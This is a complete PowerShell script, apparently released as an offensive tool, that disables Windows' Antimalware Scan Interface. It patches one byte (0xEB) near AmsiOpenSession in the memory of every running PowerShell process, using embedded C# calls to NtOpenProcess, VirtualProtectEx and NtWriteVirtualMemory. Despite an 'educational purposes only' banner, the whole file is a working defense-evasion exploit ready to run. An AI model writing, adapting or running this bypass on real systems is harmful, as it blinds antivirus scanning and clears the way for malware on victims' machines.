# ASCII Art Banner
$banner = @'

             _         ___ ___  ________ _____ 
            | |       / _ \|  \/  /  ___|_   _|
 _ __  _   _| | _____/ /_\ \ .  . \ `--.  | |  
| '_ \| | | | |/ / _ \  _  | |\/| |`--. \ | |  
| | | | |_| |   <  __/ | | | |  | /\__/ /_| |_ 
|_| |_|\__,_|_|\_\___\_| |_|_|  |_|____/ \___/ 
                                               
                                               
                                             
---------------------------------------------------------------
 Developed by Abhishek Sharma | Date: 10/08/24
 Created for educational purposes only
---------------------------------------------------------------
'@

Write-Host $banner -ForegroundColor Green


# Prompt the user for confirmation
$confirmation = Read-Host "Are you ready to nuke AMSI from this shell? Press Enter to continue"


Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class NukeAMSI
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    // NtOpenProcess: Opens a handle to a process.
    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);

    // NtWriteVirtualMemory: Writes to the memory of a process.
    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    // NtClose: Closes an open handle.
    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    // LoadLibrary: Loads the specified module into the address space of the calling process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    // GetProcAddress: Retrieves the address of an exported function or variable from the specified dynamic-link library (DLL).
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // VirtualProtectEx: Changes the protection on a region of memory within the virtual address space of a specified process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@

function ModAMSI {
    param (
        [int]$processId
    )

    Write-Host "Modifying AMSI for process ID: $processId" -ForegroundColor Cyan

    $patch = [byte]0xEB  # The patch byte to modify AMSI behavior

    $objectAttributes = New-Object NukeAMSI+OBJECT_ATTRIBUTES
    $clientId = New-Object NukeAMSI+CLIENT_ID
    $clientId.UniqueProcess = [IntPtr]$processId
    $clientId.UniqueThread = [IntPtr]::Zero
    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)

    $hHandle = [IntPtr]::Zero
    $status = [NukeAMSI]::NtOpenProcess([ref]$hHandle, [NukeAMSI]::PROCESS_VM_OPERATION -bor [NukeAMSI]::PROCESS_VM_READ -bor [NukeAMSI]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)

    if ($status -ne 0) {
        Write-Host "Failed to open process. NtOpenProcess status: $status" -ForegroundColor Red
        return
    }

    Write-Host "Loading amsi.dll..." -ForegroundColor Cyan
    $amsiHandle = [NukeAMSI]::LoadLibrary("amsi.dll")
    if ($amsiHandle -eq [IntPtr]::Zero) {
        Write-Host "Failed to load amsi.dll." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    Write-Host "Getting address of AmsiOpenSession function..." -ForegroundColor Cyan
    $amsiOpenSession = [NukeAMSI]::GetProcAddress($amsiHandle, "AmsiOpenSession")
    if ($amsiOpenSession -eq [IntPtr]::Zero) {
        Write-Host "Failed to find AmsiOpenSession function in amsi.dll." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    # Calculate the correct patch address by offsetting from AmsiOpenSession function
    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)

    Write-Host "Changing memory protection at address $patchAddr to PAGE_EXECUTE_READWRITE..." -ForegroundColor Cyan
    $oldProtect = [UInt32]0
    $size = [UIntPtr]::new(1)  # Correct conversion to UIntPtr
    $protectStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, [NukeAMSI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)

    if (-not $protectStatus) {
        Write-Host "Failed to change memory protection." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    Write-Host "Patching memory at address $patchAddr with byte 0xEB..." -ForegroundColor Cyan
    $bytesWritten = [System.UInt32]0
    $status = [NukeAMSI]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)

    if ($status -eq 0) {
        Write-Host "Memory patched successfully at address $patchAddr." -ForegroundColor Green
    } else {
        Write-Host "Failed to patch memory. NtWriteVirtualMemory status: $status" -ForegroundColor Red
    }

    Write-Host "Restoring original memory protection..." -ForegroundColor Cyan
    $restoreStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)

    if (-not $restoreStatus) {
        Write-Host "Failed to restore memory protection." -ForegroundColor Red
    }

    Write-Host "Closing handle to process with ID $processId." -ForegroundColor Cyan
    [NukeAMSI]::NtClose($hHandle)
}

function ModAllPShells {
    Write-Host "Modifying all PowerShell processes..." -ForegroundColor Cyan
    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
        Write-Host "Modifying process with ID $_.Id" -ForegroundColor Cyan
        ModAMSI -processId $_.Id
    }
}

Write-Host "Starting AMSI modification script..." -ForegroundColor Cyan
ModAllPShells
Write-Host "AMSI modification script completed." -ForegroundColor Green
